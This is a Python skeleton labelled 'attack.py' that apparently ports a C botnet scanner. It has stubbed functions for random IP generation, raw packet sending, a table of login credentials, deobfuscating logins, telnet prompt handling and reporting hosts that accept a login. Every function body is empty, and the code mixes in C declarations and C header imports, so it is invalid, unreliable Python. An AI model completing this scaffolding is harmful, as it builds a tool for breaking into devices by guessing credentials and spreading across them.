# Required python libraries for attack.py
import socket
import os
import sys
from termcolor import colored
import StringIO
import time

# need to find Python equivalent libraries for these

import stdio
import stdlib
import unistd
# need to find Python equivalent libraries for these

import includes
import killer
import main
import protocol
import rand
import resolv
import scanner
import table
import util

int scanner_pid, rsck, rsck_out, auth_table_len = 0
str scanner_rawpkt, ip_header, tcp_header = 0

def scanner_auth():
    return

def scanner_connection():
    return

def recv_strip_null(socket, buffer, length, flags):
    return

def scanner_init():
    rand.rand_init()
    return

def add_auth_entry(user, password, weight): # the class on the bottom says, that it decrypts it from a hash file basically.
# this is supposed to be a class

    return

def get_random_IP():
    return

def checksum_generic(): # dont use this, i have a checksum.py module
    return

def FD_ZERO():
    return

def setup_connection():
    return

def FD_SET():
    return

def sendto(rsck, scanner_rawpkt, size_scanner_rawpkt, msg_nosignal, sock_addr, port_addr, size_port_addr):
    return

def can_consume(scanner_connection, ptr, amount):
    return

def deobfuscate(string, length): # decrypts logins
    return

def connect(sock_addr, size_sock_addr_input):
    return

def report_working(ipv4_dest_addr, ipv4_dest_port):
    return

def consume_resp_prompt(scanner_connection):
    return

def consume_user_prompt(scanner_connection):
    return

def consume_any_prompt(scanner_connection):
    return

def consume_iacs(scanner_connection):
    return

def ipv4_get_rand_ip():
    return
